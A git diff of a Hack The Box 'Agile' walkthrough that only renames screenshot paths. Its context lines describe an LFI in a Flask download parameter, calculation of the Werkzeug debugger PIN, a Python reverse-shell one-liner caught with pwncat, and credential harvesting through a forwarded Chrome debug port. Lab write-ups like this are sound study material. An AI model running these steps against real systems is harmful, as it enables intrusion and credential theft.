@@ -19,7 +19,7 @@ layout:
 
 <table data-header-hidden><thead><tr><th width="374"></th><th align="right"></th></tr></thead><tbody><tr><td>Name</td><td align="right"><img src="../../../.gitbook/assets/agile.png" alt=""></td></tr><tr><td>OS</td><td align="right">Linux</td></tr><tr><td>Difficulty</td><td align="right">Medium</td></tr><tr><td>Vulnerabilities</td><td align="right">LFI, Misconfiguration </td></tr><tr><td>Languages</td><td align="right">Python</td></tr></tbody></table>
 
-<img src="../../../.gitbook/assets/file.excalidraw.svg" alt="Solution flow graph" class="gitbook-drawing">
+<img src="../../../.gitbook/assets/file.excalidraw (1).svg" alt="Solution flow graph" class="gitbook-drawing">
 
 ## Enumeration
 
@@ -70,19 +70,19 @@ echo '10.10.11.203 superpass.htb' | sudo tee -a /etc/hosts
 
 ### Website - TCP 80
 
-<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The website has functionality to login.
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I create an account. Once I log in, it takes me to the `/vault` page. There are two functions "Add a password" and "Export".
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 “Add a password” opens a form with the password already filled in. I finish the remaining parts and save it by clicking the icon.
 
-<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 "Export" make download a CSV file.
 
@@ -90,23 +90,23 @@ I create an account. Once I log in, it takes me to the `/vault` page. There are 
 
 When I click on "Export", there's a GET request to `/vault/export`, which returns a 302 to `/download?fn=[username]_export`_`_`_`[hex].csv`&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### LFI
 
 The download `fn` parameter has vulnerable to LFI
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Flask Debug
 
 When I try an invalid request file path, the page crashes revealing that the server is running Flask in debug mode.
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 I can open the debugger by clicking on the terminal icon in the Python code traceback. Running Python code lets I use a reverse shell. However, Werkzeug secures these interpreters with a PIN.
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 But Werkzeug didn't ensure the safety of the PIN. The PIN can be calculated if I have some strings from the system, using LFI.
 
@@ -121,7 +121,7 @@ Following the [Hacktricks](https://book.hacktricks.xyz/network-services-pentesti
 
 Username: www-data
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Mod name: flask.app
 
@@ -129,17 +129,17 @@ App.name: wsgi\_app
 
 Absolute path of app.py: /app/venv/lib/python3.10/site-packages/flask/app.py
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 MAC Address: `int("00:50:56:b9:39:fa".replace(':',''),16) =` 345052363258
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 Machine ID: ed5b159560f54721827644bc9b220d00superpass.service
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 Once all variables prepared, run exploit script to generate Werkzeug console PIN:
 
@@ -207,7 +207,7 @@ socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 On sending this, I get a shell at my `pwncat`
 
@@ -436,7 +436,7 @@ msplmee@kali:~$ ssh -L 41829:127.0.0.1:41829 corum@superpass.htb
 
 Add port 41829 to `chrome://inspect`.
 
-<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 Clicking on "inspect". The credentials for edwards can be grabbed from here.
 
